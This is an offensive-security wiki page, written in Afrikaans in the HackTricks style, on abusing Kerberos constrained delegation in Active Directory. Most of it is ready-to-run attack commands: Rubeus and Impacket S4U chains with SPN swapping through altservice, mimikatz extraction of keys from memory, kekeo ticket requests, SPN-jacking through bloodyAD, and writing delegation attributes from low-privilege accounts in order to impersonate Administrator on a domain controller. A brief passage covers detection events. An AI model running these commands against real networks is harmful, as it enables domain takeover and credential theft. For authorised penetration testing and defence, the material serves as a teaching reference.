# Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Constrained Delegation

Deur dit te gebruik, kan 'n Domain admin 'n **computer toelaat om 'n user of computer te impersonateer** teen enige **service** van 'n masjien.

- **Service for User to self (_S4U2self_):** Enige **service account that owns an SPN** kan gewoonlik 'n TGS na homself verkry namens 'n arbitrêre user. As die account ook [TrustedToAuthForDelegation](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) (T2A4D) in _userAccountControl_ het, is daardie TGS **forwardable**, wat protocol transition direk nuttig maak vir **classic constrained delegation**.
- **Service for User to Proxy(_S4U2proxy_):** 'n **service account** kan 'n TGS namens 'n user verkry na die SPNs wat in **msDS-AllowedToDelegateTo** gelys is. Die evidence ticket wat in S4U2Proxy gebruik word, moet 'n **forwardable** ticket na die delegating service wees: óf 'n werklike client-to-service ticket wat van die victim vasgelê is, óf een wat met **S4U2Self + T2A4D** gegenereer is.

**Let wel**: As 'n user in AD gemerk is as ‘_Account is sensitive and cannot be delegated_’, of 'n lid van **Protected Users** is, sal jy gewoonlik **nie in staat wees om hulle te impersonateer** deur constrained delegation nie. In moderne domains, verkies **AES** material bo aannames wat slegs op RC4 gebaseer is wanneer delegation-enabled accounts geteiken word.

Dit beteken dat, indien jy die **hash van die service kompromitteer**, jy **users kan impersonateer** en **access** namens hulle tot enige **service** oor die aangeduide masjiene kan verkry (moontlike **privesc**).

Verder sal jy **nie slegs access hê tot die service wat die user kan impersonateer nie, maar ook tot enige service**, omdat die SPN (die diensnaam wat versoek word) nie nagegaan word nie (in die ticket is hierdie deel nie geënkripteer of onderteken nie). As jy dus access tot **CIFS service** het, kan jy ook access tot **HOST service** hê deur byvoorbeeld die `/altservice`-flag in Rubeus te gebruik. Dieselfde SPN-swapping weakness word deur **Impacket getST -altservice** en ander tooling misbruik.

Ook is **LDAP service access op DC** wat nodig is om 'n **DCSync** te exploit.
```bash:Enumerate
# Powerview
Get-DomainUser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto

#ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json
```

```bash:Linux / LDAP enumeration
# NetExec: enumerate constrained / unconstrained / RBCD in one shot
nxc ldap dc.corp.local -u user -p 'Password123!' --find-delegation

# bloodyAD / msldap: LDAP-first enumeration from Linux
bloodyAD -H dc.corp.local -d corp.local -u user -p 'Password123!' msldap constrained
bloodyAD -H dc.corp.local -d corp.local -u user -p 'Password123!' msldap s4u2proxy
```
**Operateursnota:** moenie slegs op **ADUC**- of BloodHound-skermkiekies staatmaak vir **gMSA/sMSA**-hersiening nie. Daardie rekeninge versteek dikwels die gewone Delegation-oortjie, dus lys die rou **`userAccountControl`**- en **`msDS-AllowedToDelegateTo`**-attribute direk op.
```bash:Quick Way
# Generate TGT + TGS impersonating a user knowing the hash
Rubeus.exe s4u /user:sqlservice /domain:testlab.local /rc4:2b576acbe6bcfda7294d6bd18041b8fe /impersonateuser:administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:ldap /ptt
```
### Protokoloorgang teenoor Kerberos-only constrained delegation

As die compromised account **T2A4D** het, kan jy gewoonlik die volledige **`S4U2Self -> S4U2Proxy`**-ketting slegs vanaf die service key/TGT voltooi.<sup>[[2]](#references)</sup>

As dit slegs **`msDS-AllowedToDelegateTo`** het (die klassieke **"Use Kerberos only"**-modus), kan die delegation steeds misbruik word, maar die evidence ticket vir S4U2Proxy moet ’n **werklike forwardable user-to-service ticket** vir die delegating service wees. In die praktyk beteken dit dat jy ’n victim TGS vanaf **LSASS/ccache** moet steel of capture en dit in die tweede fase (`/tgs:` in Rubeus) moet invoer. ’n **non-forwardable** S4U2Self-ticket is **nie** voldoende vir classic constrained delegation nie; as dit jou enigste evidence ticket is, kyk eerder na [Resource-based Constrained Delegation](resource-based-constrained-delegation.md).<sup>[[2]](#references)</sup>

### Cross-domain constrained delegation-notas (2025+)

Sedert **Windows Server 2012/2012 R2** ondersteun die KDC constrained delegation oor domains/forests heen via S4U2Proxy-uitbreidings. Moderne builds (Windows Server 2016–2025) behou hierdie gedrag en voeg twee PAC SIDs by om protocol transition aan te dui:<sup>[[1]](#references)</sup>

- `S-1-18-1` (**AUTHENTICATION_AUTHORITY_ASSERTED_IDENTITY**) wanneer die gebruiker normaal geauthentiseer is.
- `S-1-18-2` (**SERVICE_ASSERTED_IDENTITY**) wanneer ’n service die identity deur protocol transition geassert het.

Verwag **`SERVICE_ASSERTED_IDENTITY`** binne die PAC wanneer protocol transition oor domains heen gebruik word; dit bevestig dat die S4U2Proxy-stap geslaag het.<sup>[[1]](#references)</sup>

### Impacket / Linux tooling (altservice & full S4U)

Recent Impacket (0.11.x+) stel dieselfde S4U-ketting en SPN-swapping as Rubeus bloot:<sup>[[2]](#references)</sup>
```bash
# Get TGT for delegating service (hash/aes)
getTGT.py contoso.local/websvc$ -hashes :8c6264140d5ae7d03f7f2a53088a291d

# S4U2self + S4U2proxy in one go, impersonating Administrator to CIFS then swapping to HOST
getST.py -spn CIFS/dc.contoso.local -altservice HOST/dc.contoso.local \
-impersonate Administrator contoso.local/websvc$ \
-hashes :8c6264140d5ae7d03f7f2a53088a291d -k -dc-ip 10.10.10.5

# Inject resulting ccache
export KRB5CCNAME=Administrator.ccache
smbclient -k //dc.contoso.local/C$ -c 'dir'

# If you already have a ticket/ccache for the right host, rewrite only the service class offline
# (same SPN-swapping idea as Rubeus /altservice)
tgssub.py -in Administrator.ccache -out Administrator_HOST.ccache -altservice host/dc.contoso.local
export KRB5CCNAME=Administrator_HOST.ccache
```
As jy verkies om eers die user ST te forge (bv. slegs met ’n offline hash), kombineer **ticketer.py** met **getST.py** vir S4U2Proxy. `tgssub.py` is ook handig wanneer jy reeds ’n werkende ccache het en net die service class vir dieselfde host moet omruil. Sien die oop Impacket issue #1713 vir huidige eienaardighede (KRB_AP_ERR_MODIFIED wanneer die forged ST nie met die SPN-key ooreenstem nie).<sup>[[2]](#references)</sup>

### SPN-jacking: herleiding van ’n constrained-delegation-teiken

Classic constrained delegation magtig ’n **SPN-string** in `msDS-AllowedToDelegateTo`, nie ’n onveranderlike target-SID nie. Tydens S4U2Proxy bepaal die KDC watter account tans daardie SPN besit en enkripteer die service ticket met daardie account se long-term key. Daarom kan beheer oor die delegating account, tesame met `WriteSPN` oor ’n ander service- of computer-account, ’n onveranderde delegation constraint herlei sonder `SeEnableDelegationPrivilege`.<sup>[[5]](#references)[[6]](#references)</sup>

Twee variante bestaan:<sup>[[5]](#references)</sup>

- **Ghost SPN-jacking:** die toegelate SPN is wees gelaat omdat sy vorige eienaar deleted of renamed is, of omdat die SPN verwyder is. Voeg dit direk by die gewenste target-account.
- **Live SPN-jacking:** die SPN behoort steeds aan ’n source-account. Duplicate-SPN-validasie blokkeer normaalweg die destination write, dus is `WriteSPN` op albei objects nodig: verwyder dit van die source, voeg dit by die target, kry die ticket, en herstel die oorspronklike registrasie.

Die volgende geabstraheerde Linux-vloei verskuif ’n toegelate SPN, voer S4U uit as die compromised delegating principal, en herskryf die ticket se service name na ’n nuttige service op die nuwe target.<sup>[[5]](#references)[[6]](#references)</sup>
```bash
# Omit this deletion for a ghost SPN
bloodyAD --host "$DC" -d "$DOMAIN" -u "$WRITER" -p "$PASSWORD" \
msldap delspn "$SOURCE_DN" "$DELEGATED_SPN"

bloodyAD --host "$DC" -d "$DOMAIN" -u "$WRITER" -p "$PASSWORD" \
msldap addspn "$TARGET_DN" "$DELEGATED_SPN"

getST.py -dc-ip "$DC_IP" -spn "$DELEGATED_SPN" \
-impersonate Administrator -altservice "cifs/$TARGET_FQDN" \
"$DOMAIN/$DELEGATING_ACCOUNT:$DELEGATING_PASSWORD"
```
`-altservice` is die tweede, aparte primitive. Die S4U2Proxy-ticket is geënkripteer vir die rekening wat nou `$DELEGATED_SPN` besit; omdat die ticket se diensnaam (`sname`) buite die geënkripteerde ticket-liggaam is, kan tooling ’n ander service class/hostname vervang waarvan die diens dieselfde rekening-sleutel gebruik. SPN-jacking verander eers **watter rekening-sleutel** die ticket beskerm, terwyl service-class substitution verander **waar** daardie ticket aangebied word.<sup>[[5]](#references)[[6]](#references)</sup>

Vir live jacking, keer die twee LDAP-skrywe onmiddellik ná ticket acquisition om om te voorkom dat die legitieme diens gebreek word. Op DCs met computer-account auditing geaktiveer, soek na Security-event **4742** waar `servicePrincipalName` van een rekenaar verwyder en kort daarna by ’n ander een gevoeg word, veral wanneer die SPN-hostname van die bestemming se `dNSHostName` verskil. Korrelleer dit met event **4769**: S4U2Self bied dieselfde rekening as kliënt/diens aan, terwyl S4U2Proxy **Transited Services** invul.<sup>[[5]](#references)</sup>

### Outomatisering van delegation-opstelling vanaf low-priv creds

Indien jy reeds **GenericAll/WriteDACL** oor ’n rekenaar- of diensrekening het, kan jy die vereiste attributes remotely sonder RSAT, met **bloodyAD** (2024+), stuur:
```bash
# Set TRUSTED_TO_AUTH_FOR_DELEGATION and point delegation to CIFS/DC
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local add uac WEBSRV$ -f TRUSTED_TO_AUTH_FOR_DELEGATION
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local set object WEBSRV$ msDS-AllowedToDelegateTo -v 'cifs/dc.corp.local'
```
Dit laat jou toe om ’n constrained delegation-pad vir privesc te bou sonder DA-voorregte sodra jy daardie attribute kan skryf.

- Step 1: **Kry TGT van die toegelate diens**
```bash:Get TGT
# The first step is to get a TGT of the service that can impersonate others
## If you are SYSTEM in the server, you might take it from memory
.\Rubeus.exe triage
.\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap

# If you are SYSTEM, you might get the AES key or the RC4 hash from memory and request one
## Get AES/RC4 with mimikatz
mimikatz sekurlsa::ekeys

## Request with aes
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /opsec /nowrap

# Request with RC4
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /rc4:8c6264140d5ae7d03f7f2a53088a291d
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /rc4:cc098f204c5887eaa8253e7c2749156f /outfile:TGT_websvc.kirbi
```
> [!WARNING]
> Daar is **ander maniere om 'n TGT-ticket** of die **RC4** of **AES256** te bekom sonder om SYSTEM op die rekenaar te wees, soos die Printer Bug en unconstrain delegation, NTLM relaying en Active Directory Certificate Service abuse
>
> **Deur net daardie TGT-ticket (of hash) te hê, kan jy hierdie aanval uitvoer sonder om die hele rekenaar te kompromitteer.**

- Stap 2: **Kry TGS vir die diens terwyl jy die gebruiker naboots**
```bash:Using Rubeus
# Obtain a TGS of the Administrator user to self
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /impersonateuser:Administrator /outfile:TGS_administrator

# Obtain service TGS impersonating Administrator (CIFS)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /outfile:TGS_administrator_CIFS

#Impersonate Administrator on different service (HOST)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:HOST /outfile:TGS_administrator_HOST

# Get S4U TGS + Service impersonated ticket in 1 cmd (instead of 2)
.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /user:dcorp-adminsrv$ /ticket:TGT_websvc.kirbi /nowrap

#Load ticket in memory
.\Rubeus.exe ptt /ticket:TGS_administrator_CIFS_HOST-dcorp-mssql.dollarcorp.moneycorp.local
```

```bash:kekeo + Mimikatz
#Obtain a TGT for the constrained-delegation user
tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:8c6264140d5ae7d03f7f2a53088a291d

#Get a TGS for the service you are allowed (in this case time) and for other one (in this case LDAP)
tgs::s4u /tgt:TGT_dcorpadminsrv$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLAR CORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:time/dcorp-dc.dollarcorp.moneycorp.LOCAL|ldap/dcorpdc.dollarcorp.moneycorp.LOCAL

#Load the TGS in memory
Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~ dcorp-dc.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi"'
```
[**Meer inligting op ired.team.**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation) en [**https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61**](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)<sup>[[3]](#references)[[4]](#references)</sup>

## References

- [1] [Oorsig van Kerberos Constrained Delegation (Microsoft Learn, 2025)](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [2] [Misbruik van Delegation met Impacket (Deel 2): Constrained Delegation (Black Hills, 2025)](https://www.blackhillsinfosec.com/abusing-delegation-with-impacket-part-2/)
- [3] [Kerberos Constrained Delegation (ired.team)](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation)
- [4] [Kerberosity het Domein Gedood: ’n Offensiewe Kerberos-oorsig (SpecterOps)](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- [5] [Elad Shamir - SPN-jacking: ’n Randgeval in WriteSPN-misbruik](https://www.semperis.com/blog/spn-jacking-an-edge-case-in-writespn-abuse/)
- [6] [0xdf - HTB Pirate](https://0xdf.gitlab.io/2026/09/05/htb-pirate.html)
{{#include ../../banners/hacktricks-training.md}}
